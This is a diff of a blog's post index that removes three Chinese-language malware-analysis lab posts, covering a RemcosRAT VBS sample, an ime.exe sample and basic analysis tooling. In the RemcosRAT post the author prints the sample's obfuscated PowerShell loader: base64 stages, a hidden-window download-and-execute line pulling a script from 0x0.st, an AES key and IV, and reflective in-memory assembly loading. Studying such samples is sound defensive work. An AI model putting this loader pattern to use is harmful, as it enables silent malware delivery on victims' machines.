+    <title>【惡意軟體分析】- 02</title>
     <url>/posts/17031/</url>
     <content><![CDATA[<hr>
 <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
@@ -522,380 +1011,6 @@ vssadmin -->]]></content>
         <tag>malware</tag>
         <tag>exe</tag>
         <tag>RemcosRAT</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【惡意軟體分析】- 03</title>
-    <url>/posts/32167/</url>
-    <content><![CDATA[<hr>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
-</blockquote>
-<font size='3'>
-在本練習中，我們將對 vbs 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
-</font>
-
-<br>
-
-<hr>
-<span id="more"></span>
-
-
-<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><p><font size='3'>Linux Remnux ( Static Analysis )</font></p>
-</li>
-<li><p><font size='3'>Windows 11 ( Dynamic Analysis )</font></p>
-</li>
-<li><p><a href='https://bazaar.abuse.ch/sample/01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363/' target='_blank'><font size='3' color='#33ccff'>RemcosRAT.vbs</font></a></p>
-</li>
-<li><p><font size='3'>HASH256：<code>01ed509842998f2309e2aa5ff2aaba7f12fec0e25c7a7a6f01d5d672c6a06363</code></font></p>
-</li>
-</ul>
-<hr>
-<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
-<br>
-
-
-<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
-<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
-<li><font size='3'>Virustotal   → 檢查 hash</font></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
-<li><font size='3'>檔案的名稱、副檔名皆可以更改，所以需要檢查檔案類型。</font></li>
-<li><font size='3'>查看檔案資訊是否有可疑地方</font><ul>
-<li><font size='3'><code>CreateObject(&quot;Scripting.FileSystemObject&quot;)</code> ： 建立&#x2F;修改&#x2F;刪除檔案、寫入執行指令。</font></li>
-<li><font size='3'><code>Set kSPdG = YIEhr.CreateTextFile(YoSeb &amp; &quot;\&quot; &amp; randomVBSBatName, True)&quot;</code> ： 建立一個 bat 檔案。</font></li>
-</ul>
-</li>
-</ul>
-<p><img data-src='pe-studio-1.png' align='center' width='700' alt='知道該檔案確定是 PE32 格式'></img></p>
-<br>
-
-<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
-<br>
-
-<h4 id="3️⃣-Virustotal"><a href="#3️⃣-Virustotal" class="headerlink" title="3️⃣ Virustotal"></a>3️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<br>
-
-
-<hr>
-<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
-<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
-<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
-<li><font size='3'>查看有無錄製到可疑的路徑、檔案行為</font><ul>
-<li><font size='3'>找尋 <code>wscript.exe</code> ，確實看到一個在 <code>TMP</code> 下面的 <code>bat</code> 檔 ( 明顯有問題 )。</font></li>
-</ul>
-</li>
-</ul>
-<p><img data-src='procmon-1.png' width='700' align='center' alt='Procmon'></img></p>
-<br>
-
-<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
-<li>檢查有無可疑的路徑、檔案。<ul>
-<li>找到一個可疑檔案 ( 名稱可以、副檔名不對、路徑不對、無憑證 )。</li>
-</ul>
-</li>
-</ul>
-<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
-<br>
-
-<hr>
-<h4 id="1️⃣-vbsEdit"><a href="#1️⃣-vbsEdit" class="headerlink" title="1️⃣ vbsEdit"></a>1️⃣ vbsEdit</h4><ul>
-<li><font size='3'>打開惡意程式</font></li>
-</ul>
-<p><img data-src='vba-edit-1.png' width='700' align='center' alt='使用 NotePad 查看代碼'></img></p>
-<br>
-
-<p><img data-src='vba-edit-2.png' width='700' align='center' alt='使用 VBAEdit 查看代碼'></img></p>
-<br>
-
-<hr>
-<br>
-
-
-<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><p><font size='3'>該程式會偽裝成無害的檔案誘使受害者點擊。</font></p>
-</li>
-<li><p><font size='3'>移除 <code>C:\Users\ADMINI~1\AppData\Local\Temp\1\IXeqOHqsNh.bat</code></font></p>
-</li>
-<li><p><font size='3'>移除 <code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start   Menu\Programs\Startup\StartupScript_7fff24c6.cmd </code></font></p>
-</li>
-</ul>
-<br>
-
-
-<hr>
-<br>
-
-<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
-<li><font size='3'> 整理一下代碼：<code>Pending</code></font><ul>
-<li><font size='3'>BASE64</font></li>
-<li><font size='3'>AES</font></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;%FsxeI%s%FsxeI%e%FsxeI%t%FsxeI% &quot;&quot;TIZVOs=;</span><br><span class="line"></span><br><span class="line">$QfYeqOS=&#x27;Split&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ReadLines&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Decompress&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;MainModule&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CreateDecryptor&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;CopyTo&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ChangeExtension&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;TransformFinalBlock&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;ElementAt&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;GetCurrentProcess&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;Invoke&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;),&#x27;EntryPoint&#x27;.Replace(&#x27;&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">powershell -w hidden;</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;U1RSSU5HUkFORE9NaVNUUklOR1JBTkRPTWVTVFJJTkdSQU5ET014ICgoaVNUUklOR1JkRPTXdTVFJJTkdSQU5ET01yU1RSSU5HUkFORE9NIC1TVFJJTkdSQU5ET01VU1RSSU5HUkFORE9Nc1NUUklOR1JkRPTWVTVFJJTkdSQU5ET01CU1RSSU5HUkFORE9NYVNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NY1NUUklOR1JkRPTVVFJJTkdSQU5ET01hU1RSSU5HUkFORE9NclNUUklOR1JkRPTXNTVFJJTkdSQU5ET01pU1RSSU5HUkFORE9NblNUUklOR1JkRPTWdTVFJJTkdSQU5ET00gIlNUUklOR1JkRPTWhTVFJJTkdSQU5ET010dHBzU1RSSU5HUkFORE9NOlNUUklOR1JBTkRPTS9TVFJJTkdSQU5ET00vU1RSSU5HUkFORE9NMFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET00wU1RSSU5HUkFORE9NLlNUUklOR1JkRPTXNTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NL1NUUklOR1JkRPTThTVFJJTkdSQU5ET01aU1RSSU5HUkFORE9NRFNUUklOR1JkRPTWFTVFJJTkdSQU5ET00uU1RSSU5HUkFORE9NdFNUUklOR1JBTkRPTXhTVFJJTkdSQU5ET010U1RSSU5HUkFORE9NIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">iex (($([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(&#x27;aWV4ICgoaXdyIC1Vc2VCYXNpY1BhcnNpbmcgImh0dHBzOi8vMHgwLnN0LzhaZXkucHMxIikuQ29udGVudC5SZXBsYWNlKCdBQkMnLCcnKSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWU7&#x27;)))) -replace &#x27;STRINGRANDOM&#x27;, &#x27;&#x27;);</span><br><span class="line"></span><br><span class="line">## 解碼過後</span><br><span class="line"></span><br><span class="line">iex (</span><br><span class="line">  (iwr -UseBasicParsing &quot;https://0x0.st/xxxx.ps1&quot;).Content.Replace(&#x27;ABC&#x27;,&#x27;&#x27;)</span><br><span class="line">) -ErrorAction SilentlyContinue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function decrypt_function($param_var)&#123;$aes_var=[System.Security.Cryptography.Aes]::Create();</span><br><span class="line"></span><br><span class="line">$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;</span><br><span class="line"></span><br><span class="line">$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;</span><br><span class="line"></span><br><span class="line">$aes_var.Key=[System.Convert]::FromBase64String(&#x27;ewMoxjcpzeNBZW19N7eS0/ZStjAsKH1ZQlG6Hp4+rlE=&#x27;);</span><br><span class="line"></span><br><span class="line">$aes_var.IV=[System.Convert]::FromBase64String(&#x27;GwaE+1wDAP4SIjKqb1sLhw==&#x27;);</span><br><span class="line"></span><br><span class="line">$FAPRA=$aes_var.($QfYeqOS[4])();</span><br><span class="line"></span><br><span class="line">$cJMDe=$FAPRA.($QfYeqOS[7])($param_var,0,$param_var.Length);</span><br><span class="line"></span><br><span class="line">$FAPRA.Dispose();</span><br><span class="line"></span><br><span class="line">$aes_var.Dispose();</span><br><span class="line"></span><br><span class="line">$cJMDe;</span><br><span class="line"></span><br><span class="line">&#125;function decompress_function($param_var)&#123;$OMBpZ=New-Object System.IO.MemoryStream(,$param_var);</span><br><span class="line"></span><br><span class="line">$ZMdDq=New-Object System.IO.MemoryStream;</span><br><span class="line"></span><br><span class="line">$ztAGx=New-Object System.IO.Compression.GZipStream($OMBpZ,[IO.Compression.CompressionMode]::($QfYeqOS[2]));</span><br><span class="line"></span><br><span class="line">$ztAGx.($QfYeqOS[5])($ZMdDq);</span><br><span class="line"></span><br><span class="line">$ztAGx.Dispose();</span><br><span class="line"></span><br><span class="line">$OMBpZ.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.Dispose();</span><br><span class="line"></span><br><span class="line">$ZMdDq.ToArray();</span><br><span class="line"></span><br><span class="line">&#125;$YZNls=[System.IO.File]::($QfYeqOS[1])([Console]::Title);</span><br><span class="line"></span><br><span class="line">$eOuee=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::($QfYeqOS[8])($YZNls, 6).Substring(2))));</span><br><span class="line"></span><br><span class="line">[System.Reflection.Assembly]::Load([byte[]]$eOuee).($QfYeqOS[11]).($QfYeqOS[10])($null,$null);</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">kSPdG.writeline &quot;%egViW%s%egViW%e%egViW%t%egViW% &quot;&quot;JMEsIb=$host.UI.RawUI.WindowTitle=&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
-<!-- <img data-src='hide-malware.png' width='700' align='center' alt='待解析'></img> -->
-
-<br>
-
-<hr>
-<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> <a href="https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992">A Beginner’s Analysis of RemcosRAT Malware
-</a> </font></li>
-</ul>
-<br>]]></content>
-      <categories>
-        <category>analysis</category>
-      </categories>
-      <tags>
-        <tag>analysis</tag>
-        <tag>malware</tag>
-        <tag>RemcosRAT</tag>
-        <tag>vbs</tag>
-        <tag>Pending</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【惡意軟體分析】RemcosRAT Malware - 04</title>
-    <url>/posts/49126/</url>
-    <content><![CDATA[<hr>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>這篇文章將說明分析惡意軟體。</font></p>
-</blockquote>
-<font size='3'>
-在本練習中，我們將對 ime.exe 惡意檔案進行靜態和動態分析，透過分析其樣本來了解其行為。
-</font>
-
-<br>
-
-<hr>
-<span id="more"></span>
-
-<h5 id="⚙️-Lab-Environment："><a href="#⚙️-Lab-Environment：" class="headerlink" title="⚙️ Lab Environment："></a>⚙️ Lab Environment：</h5><ul>
-<li><font size='3'>Linux Remnux ( Static Analysis )</font></li>
-<li><font size='3'>Windows 11 ( Dynamic Analysis )</font></li>
-<li><font size='3'>MD5：<code>36536F8C42C258DCC23889DE6D72019E</code></font></li>
-</ul>
-<hr>
-<h3 id="🔥-Static-Analysis-🔥"><a href="#🔥-Static-Analysis-🔥" class="headerlink" title="🔥 Static Analysis 🔥"></a><font size='5' align='center'>🔥 Static Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Static-Analysis-Tools"><a href="#🛠️-Static-Analysis-Tools" class="headerlink" title="🛠️ Static Analysis Tools"></a>🛠️ Static Analysis Tools</h4><ul>
-<li><font size='3'>PEStudio → 提取多種關鍵資訊</font></li>
-<li><font size='3'>Virustotal   → 查看執行檔</font></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-PEStudio"><a href="#1️⃣-PEStudio" class="headerlink" title="1️⃣ PEStudio"></a>1️⃣ PEStudio</h4><ul>
-<li><font size='3'>針對檔案資訊進行初步查找</font></li>
-</ul>
-<p><img data-src='pe-studio-1.png' width='700' align='center' alt='查看 Strings'></img></p>
-<br>
-
-<p><img data-src='pe-studio-2.png' width='700' align='center' alt='查看 HASH'></img></p>
-<br>
-
-<h4 id="2️⃣-Virustotal"><a href="#2️⃣-Virustotal" class="headerlink" title="2️⃣ Virustotal"></a>2️⃣ Virustotal</h4><ul>
-<li><font size='3'>將提取到的 Hash 值，提交到 <a href="https://www.virustotal.com/gui/home/upload">Virustotal</a> 查看是否已經有紀錄。</font></li>
-</ul>
-<p><img data-src='virustotal.png' width='700' align='center' alt='確定該檔案確實為惡意程式'></img></p>
-<br>
-
-
-<br>
-
-<hr>
-<h3 id="🔥-Dynamic-Analysis-🔥"><a href="#🔥-Dynamic-Analysis-🔥" class="headerlink" title="🔥 Dynamic Analysis 🔥"></a><font size='5' align='center'>🔥 Dynamic Analysis 🔥</font></h3><hr>
-<br>
-
-<h4 id="🛠️-Dynamic-Analysis-Tools"><a href="#🛠️-Dynamic-Analysis-Tools" class="headerlink" title="🛠️ Dynamic Analysis Tools"></a>🛠️ Dynamic Analysis Tools</h4><ul>
-<li><font size='3'>Procmon -&gt; 監控時間段的進程</font></li>
-<li><font size='3'>AutoRuns -&gt; 查看進程</font><!-- - <font size='3'>Wireshark -> 查看封包狀況</font> --></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="1️⃣-Procmon"><a href="#1️⃣-Procmon" class="headerlink" title="1️⃣ Procmon"></a>1️⃣ Procmon</h4><ul>
-<li>監控程式的行為</li>
-</ul>
-<p><img data-src='process-monitor-1.png' width='700' align='center' alt='查看到有建立一個檔案'></img></p>
-<br>
-
-<h4 id="2️⃣-AutoRuns"><a href="#2️⃣-AutoRuns" class="headerlink" title="2️⃣ AutoRuns"></a>2️⃣ AutoRuns</h4><ul>
-<li>查看有無可疑的路徑、檔案<ul>
-<li>明顯添加一個可疑檔案</li>
-</ul>
-</li>
-</ul>
-<p><img data-src='autoruns-1.png' width='700' align='center' alt='AutoRuns'></img></p>
-<br>
-
-<hr>
-<br>
-
-<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
-<li><font size='3'>建立 Windows NT 自動執行 ( <code>ime.exe</code> )，會在該資料夾建立一個 <code>ime.srg</code> 檔案。</font></li>
-<li><font size='3'>移除 <code>ime.exe</code> 、 <code>ime.srg</code> 。</font></li>
-</ul>
-<br>
-
-<hr>
-<br>
-
-<h4 id="❓-遭遇的問題"><a href="#❓-遭遇的問題" class="headerlink" title="❓ 遭遇的問題"></a>❓ 遭遇的問題</h4><ul>
-<li><font size='3'>分析 <code>ime.srg</code> 檔案 - <code>Pending</code></font></li>
-</ul>
-<p><img data-src='ime-srg.png' width='700' align='center' alt='待解析'></img></p>
-<br>
-
-<hr>
-<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> <a href="https://medium.com/@cam40303/a-beginners-analysis-of-remcosrat-malware-524fa43a4992">A Beginner’s Analysis of RemcosRAT Malware
-</a> </font></li>
-</ul>
-<br>]]></content>
-      <categories>
-        <category>analysis</category>
-      </categories>
-      <tags>
-        <tag>analysis</tag>
-        <tag>malware</tag>
-        <tag>exe - Pending</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>【惡意軟體分析】基礎概念篇</title>
-    <url>/posts/42213/</url>
-    <content><![CDATA[<hr>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font size='5'>前言</font></h4><blockquote>
-<p><font size='3'>轉職 ~~ 學習到 Malware Analysis 跟逆向分析的東西，把基礎概念與工具用途紀錄一下。</font></p>
-</blockquote>
-<hr>
-<span id="more"></span>
-
-
-<h2 id="📝-本篇說明紀錄兩個部分"><a href="#📝-本篇說明紀錄兩個部分" class="headerlink" title="📝 本篇說明紀錄兩個部分"></a><font size='3'>📝 本篇說明紀錄兩個部分</font></h2><ul>
-<li>Analysis Environment</li>
-<li>Analysis Step<ul>
-<li>Static Analysis</li>
-<li>Dynamic Analysis</li>
-<li>Reverse Engineering</li>
-</ul>
-</li>
-</ul>
-<br>
-
-<h2 id="📝-Analysis-Environment-分析環境"><a href="#📝-Analysis-Environment-分析環境" class="headerlink" title="📝 Analysis Environment ( 分析環境 )"></a>📝 Analysis Environment ( 分析環境 )</h2><hr>
-<ul>
-<li><font size='3'>最常見的就是 Windows ，大多的惡意程式都是針對 Windows 去設計。</font></li>
-<li><font size='3'>Remux Linux 的版本，裡面預載許多常用到的分析工具。</font></li>
-</ul>
-<br>
-
-<hr>
-<h2 id="🔥-Analysis-Step-🔥"><a href="#🔥-Analysis-Step-🔥" class="headerlink" title="🔥 Analysis Step 🔥"></a><font size='5' align='center'>🔥 Analysis Step 🔥</font></h2><hr>
-<br>
-
-
-<h3 id="📝-Analysis-Analysis"><a href="#📝-Analysis-Analysis" class="headerlink" title="📝 Analysis Analysis"></a><font size='5'>📝 Analysis Analysis</font></h3><hr>
-<ul>
-<li><font size='3'>不執行的去分析惡意程序的內容，針對 Windows 的話可以用下列工具</font><ul>
-<li><font size='3'><code>PE Studio</code> ：可以初步的做分析，查看 PE 資訊與 檔案的 strings。</font></li>
-<li><font size='3'><code>IDA</code> ：逆向標配，可以查看 assembly，需有組合語言的能力。</font></li>
-<li><font size='3'><code>Ghidra</code></font></li>
-<li><font size='3'><code>PE Bear</code> &#x2F;  <code>PE View</code> ：可以針對 PE 檔案格式做深入研究。</font></li>
-<li><font size='3'><code>oledump.py</code> ：針對 Office 格式 ( Word, Excel ) 分析裡面的 Macro。</font></li>
-<li><font size='3'><code>pdf-parser.py</code> ：針對 PDF 格式分析裡面的 Object。</font></li>
-</ul>
-</li>
-</ul>
-<br>
-
-
-<h3 id="📝-Dynamic-Analysis"><a href="#📝-Dynamic-Analysis" class="headerlink" title="📝 Dynamic Analysis"></a><font size='5' >📝 Dynamic Analysis</font></h3><hr>
-<ul>
-<li><font size='3'>靜態分析完了之後想驗證自己的想法，可以使用動態分析</font></li>
-<li><font size='3'>動態分析方法比較多種，但大致可以分成自動跟手動</font><ul>
-<li><font size='3'><code>Cuckoo</code> ：沙盒標配，資料相當完整，但偶而會被Anti-debug&#x2F;analysis的招式抓到直接不執行。</font></li>
-<li><font size='3'><code>ANY.RUN </code> ：可以直接跟沙盒內的 Windows VM 做互動。</font></li>
-</ul>
-</li>
-</ul>
-<br>
-
-<ul>
-<li><font size='3'>執行後去分析惡意程序的內容，針對 Windows 的話可以用下列工具</font><ul>
-<li><font size='3'><code>Process Hacker</code> ：記錄所有執行中的程式以及詳細內容 (Mutex, process handle…..) 一邊執行一邊看著，通常可以很好發現 Process Injection 的特徵。</font></li>
-<li><font size='3'><code>Process Explorer</code> ：記錄所有API Usage，但建議搭配視覺化工具像是ProcDOT。</font></li>
-<li><font size='3'><code>Wireshark</code> ：記錄所有網路封包。</font></li>
-<li><font size='3'><code>RegShot</code> ：對 Registry 做快照，通常在執行前與後進行快照，然後對比看是否有被修改。</font></li>
-<li><font size='3'><code>x64dbg</code> ：惡意程式分析、破解（Cracking）、程式錯誤診斷。</font></li>
-</ul>
-</li>
-</ul>
-<!-- INetSim - 在封閉的網路可以充當Server，支援各大常見protocol，已經內建在REMnux裡面。
-Apate DNS - 可以搭配 REMnux做使用，把所有網路Traffic都導向REMnux，並搭配INetSim做使用
-Fiddler - 超好用的Web proxy, 不用特別設定，就算在封閉環境內也可以看到未成功發出的Web request
-WinDBG  - Kernal mode debugger 
-dnSpy - 針對.NET的逆向工具，包含靜態跟動態分析功能 -->
-
-<br>
-
-
-<h3 id="📝-Reverse-Engineering"><a href="#📝-Reverse-Engineering" class="headerlink" title="📝 Reverse Engineering"></a><font size='5' >📝 Reverse Engineering</font></h3><hr>
-<ul>
-<li><font size='3'> 從已編譯的程式碼回溯分析其內部運作方式 的技術</font></li>
-<li><font size='3'>分析惡意程式（Malware Analysis）：找出病毒、木馬、勒索軟體的攻擊行為。</font></li>
-<li><font size='3'>破解軟體（Software Cracking）：繞過軟體授權、DRM、序號驗證。</font></li>
-<li><font size='3'>安全性分析（Security Research）：發現應用程式的漏洞（Exploit Development）。</font></li>
-<li><font size='3'>修復舊軟體（Legacy Software Maintenance）：當源碼遺失時，還原程式運作邏輯。</font></li>
-<li><font size='3'>常用逆向工程工具</font><ul>
-<li><font size='3'><code>IDA Pro</code> ：最強靜態分析、互動式反組譯	。</font></li>
-<li><font size='3'><code>Ghidra</code> ：NSA 開源逆向工具，支援多架構。</font></li>
-<li><font size='3'><code>RetDec</code> ：開源反編譯工具，可還原 C 程式碼</font></li>
-</ul>
-</li>
-</ul>
-<br>
-
-<hr>
-<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
-<li><font size='3'> <a href="https://pentestwriteup.blogspot.com/2020/08/blog-post.html">惡意程式分析 - 常用工具篇</a> </font></li>
-</ul>
-]]></content>
-      <categories>
-        <category>analysis</category>
-      </categories>
-      <tags>
-        <tag>analysis</tag>
-        <tag>malware</tag>
-        <tag>base</tag>
       </tags>
   </entry>
   <entry>
